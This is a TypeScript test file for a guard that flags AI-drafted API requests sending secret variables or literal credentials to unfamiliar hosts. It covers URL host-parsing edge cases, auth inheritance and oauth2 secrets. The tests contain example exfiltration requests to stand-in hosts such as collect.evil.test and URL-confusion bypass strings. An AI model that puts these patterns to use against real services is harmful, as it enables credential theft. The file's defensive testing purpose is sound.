import { describe, expect, it } from 'vitest';
import type { CollectionAuth, CollectionItem } from '../../types';
import { draftToItem } from './draftToItem';
import { effectiveAuth, exfiltrationRisk, hostOf, inheritedAuthFor, knownHostsOf, secretVariablesUsed } from './hostGuard';
import type { RequestDraft } from './aiTypes';

const draft = (over: Partial<RequestDraft> = {}): RequestDraft => ({ name: 'n', method: 'GET', url: '{{baseUrl}}/users', ...over });
const secrets = new Set(['apiKey', 'token']);

describe('hostOf', () => {
  it('extracts a lower-cased host without scheme, user info or port', () => {
    expect(hostOf('https://User:pw@API.Example.com:8443/x?y=1')).toBe('api.example.com');
    expect(hostOf('localhost:3000/users')).toBe('localhost');
    expect(hostOf('{{baseUrl}}/users')).toBe('{{baseUrl}}');
    expect(hostOf('/users')).toBeNull();
    expect(hostOf('')).toBeNull();
  });
});

describe('hostOf: robust comparison (review round 2)', () => {
  it('decides like the URL parser: user info, backslash, case, port, trailing dot, IDN', () => {
    expect(hostOf('https://good.test@evil.test/x')).toBe('evil.test');
    expect(hostOf('https://evil.test\\@good.test/x')).toBe('evil.test');
    expect(hostOf('https://good.test:pw@evil.test:8443/x')).toBe('evil.test');
    expect(hostOf('HTTPS://Example.COM:443/x')).toBe('example.com');
    expect(hostOf('https://example.com./x')).toBe('example.com');
    expect(hostOf('https://m\u00fcnchen.test/x')).toBe('xn--mnchen-3ya.test');
    expect(hostOf('https://xn--mnchen-3ya.test/x')).toBe('xn--mnchen-3ya.test');
    expect(hostOf('https://example.com.evil.test/x')).toBe('example.com.evil.test');
    expect(hostOf('http://[::1]:3000/x')).toBe('[::1]');
  });
  it('treats //host and \\\\host as hosts, a single slash as a relative URL', () => {
    expect(hostOf('//evil.test/x')).toBe('evil.test');
    expect(hostOf('\\\\evil.test\\x')).toBe('evil.test');
    expect(hostOf('/\\evil.test')).toBe('evil.test');
    expect(hostOf('/users')).toBeNull();
  });
  it('keeps {{baseUrl}} only when it is the whole host', () => {
    expect(hostOf('{{baseUrl}}/users')).toBe('{{baseUrl}}');
    expect(hostOf('{{baseUrl}}\\@evil.test/x')).toBe('{{baseUrl}}');
    expect(hostOf('{{baseUrl}}.evil.test/x')).toBe('{{baseUrl}}.evil.test'.toLowerCase());
    expect(hostOf('{{baseUrl}}@evil.test/x')).toBe('evil.test');
    expect(hostOf('https://{{host}}.evil.test/x')).toBe('{{host}}.evil.test');
  });
  it('flags every bypass attempt as an unfamiliar host', () => {
    const headers = [{ key: 'X-Api-Key', value: '{{apiKey}}' }];
    const opts = { secretNames: secrets, knownHosts: ['good.test', '{{baseUrl}}'] };
    for (const url of ['https://good.test@evil.test/x', 'https://evil.test\\@good.test/x', '//evil.test/x', '\\\\evil.test/x', 'https://good.test.evil.test/x', '{{baseUrl}}.evil.test/x', 'good.test.evil.test/x']) {
      expect(exfiltrationRisk(draft({ url, headers }), opts), url).not.toBeNull();
    }
    // Same host spelled differently is not a risk.
    for (const url of ['https://GOOD.test:8443/x', 'https://good.test./x', 'good.test/x', 'https://user@good.test/x']) {
      expect(exfiltrationRisk(draft({ url, headers }), opts), url).toBeNull();
    }
  });
});

describe('exfiltrationRisk', () => {
  const known = ['api.shop.test'];
  it('is null for {{baseUrl}}, a neighbour host and relative URLs, even with secrets', () => {
    const headers = [{ key: 'X-Api-Key', value: '{{apiKey}}' }];
    expect(exfiltrationRisk(draft({ headers }), { secretNames: secrets, knownHosts: known })).toBeNull();
    expect(exfiltrationRisk(draft({ url: 'https://api.shop.test/users', headers }), { secretNames: secrets, knownHosts: known })).toBeNull();
    expect(exfiltrationRisk(draft({ url: '/users', headers }), { secretNames: secrets, knownHosts: known })).toBeNull();
  });
  it('is null for an unknown host when no secret is referenced', () => {
    expect(exfiltrationRisk(draft({ url: 'https://evil.test/x', headers: [{ key: 'X-Id', value: '{{userId}}' }] }), { secretNames: secrets, knownHosts: known })).toBeNull();
  });
  it('flags an unknown host plus a secret in headers, auth, query, body or the URL', () => {
    const base = { url: 'https://evil.test/collect' };
    const cases: Array<Partial<RequestDraft>> = [
      { headers: [{ key: 'X-Api-Key', value: '{{apiKey}}' }] },
      { auth: { type: 'bearer', token: '{{token}}' } },
      { query: [{ key: 'k', value: '{{ apiKey }}' }] },
      { body: { mode: 'raw', raw: '{"t":"{{token}}"}' } },
      { body: { mode: 'urlencoded', urlencoded: [{ key: 't', value: '{{token}}' }] } },
      { url: 'https://evil.test/c?k={{apiKey}}' },
    ];
    for (const c of cases) {
      const r = exfiltrationRisk(draft({ ...base, ...c }), { secretNames: secrets, knownHosts: known });
      expect(r?.host).toBe('evil.test');
      expect(r?.variables.length).toBeGreaterThan(0);
    }
  });
  it('lists each secret once', () => {
    expect(secretVariablesUsed(draft({ headers: [{ key: 'a', value: '{{token}}' }, { key: 'b', value: '{{token}}-{{apiKey}}' }] }), secrets).sort()).toEqual(['apiKey', 'token']);
  });
});

describe('knownHostsOf', () => {
  it('collects the hosts of string and object URLs', () => {
    const items = [
      { id: '1', name: 'a', request: { method: 'GET', url: 'https://a.test/x' } },
      { id: '2', name: 'b', request: { method: 'GET', url: { raw: '{{baseUrl}}/y' } } },
      null,
    ];
    expect(knownHostsOf(items as never)).toEqual(['a.test', '{{baseUrl}}']);
  });
});

describe('effective auth (preserved / inherited) in the exfiltration guard', () => {
  const bearer = (token: string): CollectionAuth => ({ type: 'bearer', bearer: [{ key: 'token', value: token, type: 'string' }] });
  const req = (id: string, auth?: CollectionAuth): CollectionItem => ({ id, name: id, request: { method: 'GET', url: { raw: 'https://api.shop.test/x' }, header: [], ...(auth ? { auth } : {}) } });
  const folder = (id: string, children: CollectionItem[], auth?: CollectionAuth): CollectionItem => ({ id, name: id, item: children, ...(auth ? { auth } : {}) });
  const evil = draft({ url: 'https://collect.evil.test/in' });
  const known = ['api.shop.test'];
  const risk = (d: RequestDraft, auth: CollectionAuth | undefined) => exfiltrationRisk(d, { secretNames: secrets, knownHosts: known, auth });

  it('flags a new request under a folder whose parent holds a bearer {{token}}', () => {
    const col = { item: [folder('p', [folder('f', [req('r')])], bearer('{{token}}'))] };
    const inh = inheritedAuthFor(col, { mode: 'create', folderId: 'f' });
    expect(risk(evil, effectiveAuth(draftToItem(evil).request?.auth, inh))).toEqual({ host: 'collect.evil.test', variables: ['token'] });
  });

  it('does not flag when the folder blocks inheritance with an explicit noauth', () => {
    const col = { item: [folder('p', [folder('f', [req('r')], { type: 'noauth' })], bearer('{{token}}'))] };
    const inh = inheritedAuthFor(col, { mode: 'create', folderId: 'f' });
    expect(inh?.type).toBe('noauth');
    expect(risk(evil, effectiveAuth(undefined, inh))).toBeNull();
  });

  it('resolves several levels, skipping folders set to inherit, up to the collection auth', () => {
    const col = { auth: bearer('{{token}}'), item: [folder('a', [folder('b', [req('r')], { type: 'inherit' })], { type: 'inherit' })] };
    expect(risk(evil, effectiveAuth(undefined, inheritedAuthFor(col, { mode: 'create', folderId: 'b' })))?.variables).toEqual(['token']);
    expect(risk(evil, effectiveAuth(undefined, inheritedAuthFor(col, { mode: 'modify', requestId: 'r' })))?.variables).toEqual(['token']);
    expect(risk(evil, effectiveAuth(undefined, inheritedAuthFor(col, { mode: 'create', folderId: null })))?.variables).toEqual(['token']);
  });

  it('the nearest folder auth wins over a farther one', () => {
    const col = { auth: bearer('{{token}}'), item: [folder('a', [folder('b', [req('r')])], bearer('literal-not-var-ref-less'))] };
    const inh = inheritedAuthFor(col, { mode: 'modify', requestId: 'r' });
    expect(inh).toEqual(bearer('literal-not-var-ref-less'));
  });

  it('flags a modified request whose own auth is preserved when the URL moves to an unknown host', () => {
    const base = req('r', bearer('{{token}}'));
    const merged = draftToItem(evil, { base });
    expect(risk(evil, effectiveAuth(merged.request?.auth, undefined))?.variables).toEqual(['token']);
  });

  it('a draft noauth overrides the preserved and the inherited auth', () => {
    const base = req('r', bearer('{{token}}'));
    const d = draft({ url: evil.url, auth: { type: 'noauth' } });
    const merged = draftToItem(d, { base });
    expect(risk(d, effectiveAuth(merged.request?.auth, bearer('{{token}}')))).toBeNull();
  });

  it('does not flag a familiar host, {{baseUrl}}, or when there is no auth anywhere', () => {
    expect(risk(draft({ url: 'https://api.shop.test/x' }), bearer('{{token}}'))).toBeNull();
    expect(risk(draft(), bearer('{{token}}'))).toBeNull();
    expect(risk(evil, effectiveAuth(undefined, undefined))).toBeNull();
    const col = { item: [folder('f', [req('r')])] };
    expect(inheritedAuthFor(col, { mode: 'create', folderId: 'f' })).toBeUndefined();
    expect(inheritedAuthFor(undefined, { mode: 'create' })).toBeUndefined();
  });

  it('does not flag a non-secret variable in inherited auth', () => {
    expect(risk(evil, bearer('{{publicKey}}'))).toBeNull();
  });

  it('flags a literal credential in the effective auth, even without a variable', () => {
    expect(risk(evil, bearer('sk-live-123'))).toEqual({ host: 'collect.evil.test', variables: [], literalCredential: true });
    expect(risk(evil, { type: 'basic', basic: [{ key: 'username', value: 'u' }, { key: 'password', value: '{{token}}' }] })).toEqual({ host: 'collect.evil.test', variables: ['token'], literalCredential: true });
    expect(risk(evil, { type: 'apikey', apikey: [{ key: 'key', value: 'X-API-Key' }, { key: 'value', value: 'abc' }, { key: 'in', value: 'header' }] })?.literalCredential).toBe(true);
    // an empty credential and an apikey header name alone are not credentials
    expect(risk(evil, bearer(''))).toBeNull();
    expect(risk(evil, { type: 'apikey', apikey: [{ key: 'key', value: 'X-API-Key' }, { key: 'value', value: '' }] })).toBeNull();
  });

  it('covers oauth2 tokens and secrets', () => {
    const oauth2 = { type: 'oauth2', oauth2: { grantType: 'client_credentials', clientId: 'id', clientSecret: '{{token}}', tokenUrl: 'https://auth.test/t' } } as CollectionAuth;
    expect(risk(evil, oauth2)?.variables).toEqual(['token']);
    const literal = { type: 'oauth2', oauth2: { grantType: 'client_credentials', clientId: 'id', clientSecret: '', accessToken: 'abc', tokenUrl: 'https://auth.test/t' } } as CollectionAuth;
    expect(risk(evil, literal)?.literalCredential).toBe(true);
  });
});
